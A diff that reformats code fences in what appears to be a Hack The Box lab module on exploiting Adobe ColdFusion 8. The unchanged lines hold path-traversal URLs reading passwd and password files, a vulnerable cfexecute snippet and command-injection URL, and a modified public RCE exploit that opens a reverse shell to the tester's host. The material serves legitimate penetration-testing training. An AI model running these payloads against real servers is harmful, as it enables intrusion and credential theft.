@@ -6,8 +6,7 @@ Now that we know that ColdFusion 8 is a target, the next step is to check for ex
 
 #### Searchsploit
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ searchsploit adobe coldfusion
 
 ------------------------------------------------------------------------------------------ ---------------------------------
@@ -44,8 +43,7 @@ As we know, the version of ColdFusion running is `ColdFusion 8`, and there are t
 
 Take the following ColdFusion code snippet:
 
-```
-        html
+```html
 <cfdirectory directory="#ExpandPath('uploads/')#" name="fileList">
 <cfloop query="fileList">
     <a href="uploads/#fileList.name#">#fileList.name#</a><br>
@@ -56,8 +54,7 @@ In this code snippet, the ColdFusion `cfdirectory` tag lists the contents of the
 
 However, the `directory` parameter is not validated correctly, which makes the application vulnerable to a Path Traversal attack. An attacker can exploit this vulnerability by manipulating the `directory` parameter to access files outside the `uploads` directory.
 
-```
-        http
+```http
 http://example.com/index.cfm?directory=../../../etc/&file=passwd
 ```
 
@@ -75,15 +72,13 @@ These ColdFusion files are vulnerable to a directory traversal attack in `Adobe 
 
 With this vulnerability, attackers can access files outside the intended directory by including `../` sequences in the file parameter. For example, consider the following URL:
 
-```
-        http
+```http
 http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en
 ```
 
 In this example, the URL attempts to access the `mappings.cfm` file in the `/CFIDE/administrator/settings/` directory of the web application with a specified `en` locale. However, a directory traversal attack can be executed by manipulating the URL's locale parameter, allowing an attacker to read arbitrary files located outside of the intended directory, such as configuration files or system files.
 
-```
-        http
+```http
 http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
 ```
 
@@ -91,8 +86,7 @@ In this example, the `../` sequences have been used to replace a valid `locale` 
 
 Using `searchsploit`, copy the exploit to a working directory and then execute the file to see what arguments it requires.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ searchsploit -p 14641
 
   Exploit: Adobe ColdFusion - Directory Traversal
@@ -105,8 +99,7 @@ Copied EDB-ID #14641's path to the clipboard
 
 #### Coldfusion - Exploitation
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
 hiimeins@htb[/htb]$ python2 14641.py 
 
@@ -121,8 +114,7 @@ By providing the correct parameters to the exploit script and specifying the pat
 
 #### Coldfusion - Exploitation
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
 
 ------------------------------
@@ -151,16 +143,14 @@ In contrast, an unauthenticated RCE vulnerability allows an attacker to execute 
 
 In the context of ColdFusion web applications, an Unauthenticated RCE attack occurs when an attacker can execute arbitrary code on the server without requiring any authentication. This can happen when a web application allows the execution of arbitrary code through a feature or function that does not require authentication, such as a debugging console or a file upload functionality. Take the following code:
 
-```
-        html
+```html
 <cfset cmd = "#cgi.query_string#">
 <cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">
 ```
 
 In the above code, the `cmd` variable is created by concatenating the `cgi.query_string` variable with a command to be executed. This command is then executed using the `cfexecute` function, which runs the Windows `cmd.exe` program with the specified arguments. This code is vulnerable to an unauthenticated RCE attack because it does not properly validate the `cmd` variable before executing it, nor does it require the user to be authenticated. An attacker could simply pass a malicious command as the `cgi.query_string` variable, and it would be executed by the server.
 
-```
-        http
+```http
 # Decoded: http://www.example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt
 
 http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
@@ -170,8 +160,7 @@ This URL includes a semicolon (`%3B`) at the beginning of the query string, whic
 
 An example of a ColdFusion Unauthenticated RCE attack is the `CVE-2009-2265` vulnerability that affected Adobe ColdFusion versions 8.0.1 and earlier. This exploit allowed unauthenticated users to upload files and gain remote code execution on the target host. The vulnerability exists in the FCKeditor package, and is accessible on the following path:
 
-```
-        http
+```http
 http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
 ```
 
@@ -179,8 +168,7 @@ http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connector
 
 #### Searchsploit
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ searchsploit -p 50057
 
   Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
@@ -191,8 +179,7 @@ File Type: Python script, ASCII text executable
 Copied EDB-ID #50057's path to the clipboard
 ```
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
 ```
 
@@ -200,8 +187,7 @@ A quick `cat` review of the code indicates that the script needs some informatio
 
 #### Exploit Modification
 
-```
-        python
+```python
 if __name__ == '__main__':
     # Define some information
     lhost = '10.10.14.55' # HTB VPN IP
@@ -215,8 +201,7 @@ The exploit will take a bit of time to launch, but it eventually will return a f
 
 #### Exploitation
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python3 50057.py 
 
 Generating a payload...
@@ -261,8 +246,7 @@ Ncat: Connection from 10.129.247.30:49866.
 
 #### Reverse Shell
 
-```
-        cmd
+```bat
 Microsoft Windows [Version 6.1.7600]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
